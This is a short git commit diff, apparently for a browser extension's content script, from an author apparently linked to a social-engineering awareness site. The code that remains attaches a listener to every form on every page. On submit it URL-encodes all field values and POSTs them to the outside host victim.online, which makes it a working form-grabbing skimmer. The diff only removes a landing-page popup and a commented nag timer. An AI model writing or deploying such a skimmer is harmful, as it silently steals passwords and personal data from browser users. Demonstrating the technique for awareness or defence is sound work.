5ffddb6120c6c54771b450b1195c571795104f70
Richard De Vere <contact@TheAntiSocialEngineer.com>
2017-07-16 22:02:52 +0100

    Update content.js

--- content.js
+++ content.js
@@ -1,11 +1,9 @@
-
 //get every form
 var forms = document.forms;
 
 //called when a submit event happens
 function formSubmit(event) {
     var xhr = new XMLHttpRequest();
-    function { window.open('https://theantisocialengineer.com/chrome-extension-landing-page/') }, 1000)
     xhr.open('POST', 'http://victim.online/');
     var string = '';
     // iterate over all of the form fields and urlencode them. There'll be an extra & at the end but who cares
@@ -19,8 +17,4 @@ function formSubmit(event) {
 // add an event listener to the submit event for every form in the page
 for (index = 0; index < forms.length; ++index) {
     forms[index].addEventListener('submit', formSubmit);
-}
-
-//if(document.location.href.indexOf('theantisocialengineer.com') === -1){
-//var naggot = setTimeout( function(){ window.open('https://theantisocialengineer.com/chrome-extension-landing-page/') }, 1000);
 }
